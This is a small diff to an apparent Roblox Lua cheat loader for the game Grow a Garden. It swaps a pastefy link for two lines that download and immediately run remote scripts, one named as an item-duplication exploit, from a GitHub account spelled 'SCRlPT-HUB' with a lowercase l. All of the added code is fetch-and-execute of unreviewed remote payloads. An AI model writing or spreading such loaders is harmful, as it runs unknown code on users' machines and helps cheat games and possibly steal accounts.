@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://pastefy.app/DD77Gz4l/raw"))()
+-- Run first script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/Grow-A-Garden/refs/heads/main/GrowAGardenDUPE"))()
+
+-- Wait for 10 seconds
+wait(10)
+
+-- Run second script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/Kia/refs/heads/main/GrowAGarden_Script"))()
